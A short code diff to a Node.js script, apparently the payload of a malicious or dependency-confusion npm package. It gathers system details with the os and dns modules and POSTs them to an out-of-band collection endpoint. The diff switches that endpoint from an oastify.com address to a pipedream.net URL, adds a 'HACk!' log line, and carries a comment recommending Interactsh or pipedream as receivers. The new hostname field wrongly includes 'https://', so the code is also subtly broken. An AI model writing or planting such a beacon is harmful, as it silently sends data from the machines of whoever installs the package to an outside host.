@@ -1,3 +1,4 @@
+console.log('HACk!')
 const os = require("os");
 const dns = require("dns");
 const querystring = require("querystring");
@@ -22,8 +23,8 @@ var postData = querystring.stringify({
 });
 
 var options = {
-    hostname: "rtoky2bagrps50g43vgc9hs07rdj1apz.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
-    port: 80,
+    hostname: "https://eojm50og9htneog.m.pipedream.net", //replace burpcollaborator.net with Interactsh or pipedream
+    port: 443,
     path: "/",
     method: "POST",
     headers: {
@@ -44,4 +45,3 @@ req.on("error", (e) => {
 
 req.write(postData);
 req.end();
-
